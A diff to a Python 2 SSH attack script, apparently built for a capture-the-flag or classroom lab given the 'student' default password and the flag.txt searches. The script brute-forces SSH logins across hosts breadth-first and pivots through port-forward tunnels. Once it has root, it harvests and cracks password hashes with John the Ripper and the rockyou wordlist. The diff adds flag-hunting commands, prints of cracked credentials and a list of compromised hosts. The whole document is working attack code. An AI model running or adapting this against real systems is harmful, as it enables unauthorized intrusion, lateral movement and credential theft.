@@ -18,6 +18,8 @@ WORDLIST = "/usr/share/wordlists/rockyou.txt"
 DEFAULT_PASS = "student"
 ROOT = "root"
 
+final_network = []
+
 q = Queue.Queue()
 ip_list = []
 
@@ -115,7 +117,8 @@ def begin_attack(client):
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
-        verbose("\nBrute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port))
+        # verbose("\nBrute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port))
+        print "\nBrute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port)
 
         user_len = len(USERNAMES)
         passwd_len = len(PASSWORDS)
@@ -125,6 +128,8 @@ def begin_attack(client):
         # first username in USERNAMES is always 'root'
         logged_in = False
         log_root = False
+        userCred = ""
+        passCred = ""
         while (userN < user_len) and (not logged_in):
             userCred = USERNAMES[userN]
             passwd = 0
@@ -134,7 +139,8 @@ def begin_attack(client):
                     if server.initial:
                         # attempt to login with current creds
                         client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
-                        verbose("Connected to %s:%s" % (server.host, server.ssh_port))
+                        # verbose("Connected to %s:%s" % (server.host, server.ssh_port))
+                        print "Connected to %s:%s" % (server.host, server.ssh_port)
                         # initial_comps -= 1
                         initial_comps = True
                     else:
@@ -147,6 +153,7 @@ def begin_attack(client):
                     # if we are logged in as root
                     if userCred == "root":
                         log_root = True
+
 
                 except Exception as e:
                     # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
@@ -176,9 +183,20 @@ def begin_attack(client):
                     # set up forwarder to the new computer
                     try:
                         forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
-                        verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
+                        # verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
+                        print 'Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port)
                     except Exception as e:
                         print e
+
+            # try to find flag for the current user
+            stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
+            try:
+                flag = stdout.readlines()
+                print "FLAG FOUND: %s" % (flag)
+                return
+            except Exception as e:
+                print "Flag not found on %s@%s" % (userCred, server.host)
+
 
             # if we are logged in as root
             if log_root:
@@ -191,6 +209,18 @@ def begin_attack(client):
                 for cred in user_passes:
                     # add the creds to the dict of accounts
                     server.accounts[cred[0]] = cred[1]
+
+                # append the current box to the final network list
+                final_network.append(server)
+
+                # try to find the flag on the box because root can see all
+                stdin, stdout, stderr = client.exec_command("cat /home/*/flag.txt")
+                try:
+                    flag = stdout.readlines()
+                    print "FLAG FOUND: %s" % (flag)
+                    return
+                except Exception as e:
+                    print "Flag not anywhere on %s" % (server.host)
 
             # put back in queue if never logged in as root
             else:
@@ -227,7 +257,7 @@ def crack_with_john(hashes_lst):
         f.write(str(h) + '\n')
     f.close()
 
-    print "Cracking newly found hashes...\n"
+    print "Cracking newly found hashes..."
 
     # supress john output
     os.system("john --format=sha512crypt --wordlist=%s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
@@ -256,6 +286,9 @@ def crack_with_john(hashes_lst):
             PASSWORDS.append(passwd)
             print "Adding \"%s\" to PASSWORD list" % passwd
         combos.append((user, passwd))
+        print "New Credential: %s/%s" % (user, passwd)
+
+    print ""
 
     return combos
     
@@ -294,4 +327,6 @@ if __name__ == "__main__":
 
     begin_attack(client)
     # stops running threads
+    print final_network
+
     sys.exit(0)
